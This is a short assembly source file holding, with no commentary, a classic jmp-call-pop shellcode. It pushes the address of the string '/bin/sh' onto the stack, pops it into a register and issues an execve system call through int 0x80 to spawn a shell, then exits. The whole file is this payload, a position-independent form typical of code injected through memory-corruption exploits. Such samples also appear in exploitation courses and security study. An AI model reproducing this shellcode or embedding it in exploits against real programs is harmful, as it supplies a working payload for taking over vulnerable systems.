.section .data

.section .text
.globl _start

_start:

	jmp end

hop:

	xor %rax, %rax	
	add $11, %al
	pop %rbx
	xor %rcx, %rcx
	xor %rdx, %rdx
	int $0x80
	
	xor %rax, %rax
	xor %rbx, %rbx
	mov $1, %al
	int $0x80
end:
	call hop
	.ascii "/bin/sh\0"
